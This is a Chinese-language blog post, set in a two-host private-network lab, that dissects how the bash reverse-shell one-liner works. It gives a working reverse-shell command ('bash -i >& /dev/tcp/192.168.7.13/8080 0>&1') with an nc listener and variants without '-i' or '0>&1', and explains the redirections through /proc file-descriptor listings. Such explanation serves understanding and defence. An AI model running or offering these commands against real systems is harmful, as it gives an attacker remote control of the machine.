# 反弹Shell引申-bash的socket操作

参考文章

1. [Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析](https://www.jianshu.com/p/80d6b5a61372)

2. [linux shell 脚本实现tcp/upd协议通讯（重定向应用）](https://www.cnblogs.com/chengmo/archive/2010/10/22/1858302.html)

本来以为bash没有 socket 操作的接口的, 没想到一次反弹shell攻击发现了这样的功能...

## 1. 示例场景

服务器A: 192.168.7.13
服务器B: 192.168.7.14

A使用`nc`监听8080端口, 模拟黑帽子的控制机.

```log
[root@k8s-master-7-13 ~]# nc -l 0.0.0.0 8080
## 这里开始阻塞
```

然后B发起反弹Shell连接, 模拟被挂马的内网服务器.

```
[root@k8s-master-7-14 ~]# bash -i >& /dev/tcp/192.168.7.13/8080 0>&1
## 这里也开始阻塞
```

然后A的bash发生变化.

```
[root@k8s-master-7-13 ~]# nc -l 0.0.0.0 8080
[root@k8s-master-7-14 ~]# ls                 ## 输入命令
ls                                           ## 注意输入命令也被当作结果返回
kubeadm-config.yaml
```

可以看到A的终端已经变成了B的界面, 现在黑帽子可以自由的操作B机器了, 当黑帽子输入exit从A机器上的B终端退出时, B机器上的反弹Shell才会结束.

## 2. 分析`-i`的作用

`bash -i`表示打开一个交互式(interactive)终端, 与创建的socket的进行通信.

尝试把`-i`选项移除, 重新测试, 变化在于反弹shell连接上控制机后, 终端提示符没有改变.

```
[root@k8s-master-7-13 ~]# nc -l 0.0.0.0 8080
## 这里开始阻塞, 反弹Shell连接后没有变化
ls                                           ## 输入命令
kubeadm-config.yaml                          ## 返回结果
```

除了这个, 还有一点需要注意: 加了`-i`的反弹Shell输出的命令也被当前结果返回了, 移除后则不会.

可以猜测, `-i`选项可以将主控机A到被控机B的标准输入也返回.

> 在主控机A的B终端上按Ctrl+C退出时, 反弹Shell进程也退出了.

## 3. 分析文件描述符

符号`>&`可以复制一个输出描述符(其实是剪切), 该符号前没有字符, 表示将调用方控制台的标准输出, 定向到打开的socket的标准输出中.

但是这里这个符号有一点特殊的涵义, 就是bash不能什么都不干就打开一个socket连接.

```
[root@k8s-master-7-14 ~]# bash -i /dev/tcp/192.168.7.13/8080
bash: /dev/tcp/192.168.7.13/8080: 没有那个文件或目录
```

正确操作起码要将socket打开为文件描述符才行, 比如`<>`和`>&`, 这个可看一下使用`exec`操作文件描述符的相关文章.

不考虑`<&`, 因为根本无法运行.

```
[root@k8s-master-7-14 ~]# bash <& /dev/tcp/192.168.7.13/8080
-bash: /dev/tcp/192.168.7.13/8080: 模糊的重定向
```

至于`<>`的作用, 还没有头绪, 先看看`>&`的分析吧, 还是比较有把握的.

主控机A

```
[root@k8s-master-7-13 ~]# nc -l 0.0.0.0 8080
## 阻塞, 等待输入命令
```

被控机B

```
[root@k8s-master-7-14 ~]# bash >& /dev/tcp/192.168.7.13/8080
## 阻塞
```

在被控机B上执行如下命令得到反弹Shell的pid, 并查看其相关的fd

```
[root@k8s-master-7-14 fd]# netstat -nap | grep 8080
tcp        0      0 192.168.7.14:59348      192.168.7.13:8080       ESTABLISHED 10738/bash
[root@k8s-master-7-14 fd]# cd /proc/10738/fd
[root@k8s-master-7-14 fd]# ll
总用量 0
lrwx------ 1 root root 64 9月   6 16:49 0 -> /dev/pts/0
lrwx------ 1 root root 64 9月   6 16:49 1 -> socket:[43335381]
lrwx------ 1 root root 64 9月   6 16:49 2 -> socket:[43335381]
```

可以看到, 该bash的标准输入没有改变, 但是其标准输出和标准错误都绑定到了打开的socket上. 

于是, 主控机A上输入的任何命令都不会得到回应, 因为socket与被控机B没有联系. 而在被控机B的终端上输入命令, 可以在A的终端上看到结果, 这是可以理解的.

在关于`exec`操作文件描述符的相关文章里提到, `>&`是用来复制(剪切)文件描述符的, 这里`>&`前面没有数值, 所以这句就是将该bash进程的标准输出与打开的socket绑定, 于是就有了上面的结果.

加上`0>&1`的目的就是为了能让该bash的标准输入也和socket绑定, 这样该bash进程就可以得到来自该socket的命令并向其写入结果了.
